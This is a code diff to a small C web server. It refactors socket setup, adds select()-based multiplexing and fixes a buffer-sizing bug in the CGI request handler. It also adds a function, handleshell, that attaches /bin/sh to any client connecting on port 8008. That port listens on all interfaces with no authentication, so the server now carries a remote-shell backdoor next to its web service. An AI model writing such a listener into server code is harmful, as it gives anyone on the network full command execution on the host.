@@ -6,13 +6,85 @@
 #include <netinet/in.h>
 #include <sys/socket.h>
 #include <sys/types.h>
+#include <sys/select.h>
 #include <string.h>
 #include <time.h>
 
 #define HEADER_SIZE 10240L
 
+typedef int (*sockhandler)(int, struct sockaddr*, socklen_t);
+typedef struct Server Server;
+
+struct Server{
+	int 			sock;
+	sockhandler 	handler;
+};
+
 int
-handle(int fd, struct sockaddr *addr, socklen_t size)
+setupsock(int port)
+{
+	int sock;
+	
+	struct sockaddr_in sin;
+	sock				= 	socket(AF_INET, SOCK_STREAM, 0);
+	sin.sin_family 		=	AF_INET;
+	sin.sin_port		=	htons(port);
+	sin.sin_addr.s_addr	=	INADDR_ANY;
+
+	/* Set reuse for socket */
+	int true = 1;
+	if(setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &true, sizeof(int)) < 0){
+		fprintf(stderr, "Failed to set socket options!\n");
+		close(sock);
+		return -1;
+	}
+	
+	/* Bind */
+	if(bind(sock, (struct sockaddr *)&sin, sizeof(sin)) < 0){
+		fprintf(stderr, "Failed to bind to port %d!\n", port);
+		return -1;
+	}
+
+	/* Start listening */
+	listen(sock, 50);
+
+	return sock;
+}
+
+int
+servermux(Server s[], int n)
+{
+	int i;
+	fd_set readfds;
+
+	FD_ZERO(&readfds);
+	for(i = 0; i < n; i++)
+		FD_SET(s[i].sock, &readfds);
+
+	if(select(FD_SETSIZE, &readfds, NULL, NULL, NULL) < 0)
+		return -1;
+
+	for(i = 0; i < n; i++)
+		if(FD_ISSET(s[i].sock, &readfds))
+			return i;
+
+	return -1;
+}
+
+int
+handleshell(int fd, struct sockaddr *addr, socklen_t size)
+{
+	if(fork())
+		return 0;
+	dup2(fd, 2);
+	dup2(fd, 1);
+	dup2(fd, 0);
+	execlp("/bin/sh", NULL, NULL);
+	return 0;
+}
+
+int
+handlecgi(int fd, struct sockaddr *addr, socklen_t size)
 {
 	FILE *sock = NULL;
 	char *line, *request;
@@ -44,13 +116,14 @@ handle(int fd, struct sockaddr *addr, socklen_t size)
 		fprintf(stdout, "Wasn't POST/GET or no file.\n");
 		return 1;
 	}
-
+	fprintf(stdout, "Request: %s\n", request);
 	/* string bullshit to get ./filename*/
 	char *temp;
 	temp = strstr(request, "HTTP");
 	temp[-1] = '\0';
-	temp = malloc(sizeof(request+1));
-	snprintf(temp, sizeof(temp), ".%s", request);
+	temp = malloc(linelen);
+	snprintf(temp, linelen, ".%s", request);
+	temp[linelen-1] = '\0';
 	
 	clock = time(NULL);
 	fprintf(stdout, "requested %s @ %s\n", temp, ctime(&clock));
@@ -68,44 +141,30 @@ handle(int fd, struct sockaddr *addr, socklen_t size)
 int
 main(int argc, char **argv)
 {
-	int websock, port;
+	int webport = 8080;
+	Server services[2];
 
-	port = 8080;
 	if (argc > 1)
-		port = atoi(argv[1]);
-	
-	/* Setup Socket */
-	struct sockaddr_in sin;
-	websock			= 	socket(AF_INET, SOCK_STREAM, 0);
-	sin.sin_family 		=	AF_INET;
-	sin.sin_port		=	htons(port);
-	sin.sin_addr.s_addr	=	INADDR_ANY;
+		webport = atoi(argv[1]);
 
-	/* Set reuse for socket */
-	int true = 1;
-	if(setsockopt(websock, SOL_SOCKET, SO_REUSEADDR, &true, sizeof(int)) < 0){
-		fprintf(stderr, "Failed to set socket options!\n");
-		close(websock);
-		return -1;
-	}
-	
-	/* Bind */
-	if(bind(websock, (struct sockaddr *)&sin, sizeof(sin)) < 0){
-		fprintf(stderr, "Failed to bind to port %d!\n", port);
-		return -1;
-	}
+	services[0].sock 	= 	setupsock(webport);
+	services[0].handler 	= 	handlecgi;
+	services[1].sock	=	setupsock(8008);
+	services[1].handler	=	handleshell;
 
-	/* Start listening */
-	listen(websock, 50);
-	
 	while(1){
-		int fd;
+		Server s;
+		int i, fd;
 		struct sockaddr *addr;
 		socklen_t size = 0;
 
-		fd = accept(websock, addr, &size);
+		i = servermux(services, 2);
+		if(i < 0)
+			continue;
+		s = services[i];
+		fd = accept(s.sock, addr, &size);
 		if(!fork())
-			handle(fd, addr, size);
+			s.handler(fd, addr, size);
 		else
 			close(fd);
 	}
